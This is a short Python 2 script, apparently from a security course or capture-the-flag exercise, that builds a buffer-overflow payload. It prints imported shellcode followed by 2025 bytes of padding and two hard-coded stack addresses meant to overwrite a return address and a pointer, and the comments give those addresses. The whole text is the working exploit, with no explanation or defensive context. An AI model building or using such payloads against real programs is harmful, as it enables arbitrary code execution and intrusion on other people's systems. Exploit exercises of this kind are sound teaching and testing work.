from shellcode import shellcode
print shellcode + 'E'*2025 + '\x38\xb2\xfe\xbf' + '\x4c\xba\xfe\xbf'

#a = 0xbffeb238
#p = 0xbffeba4c
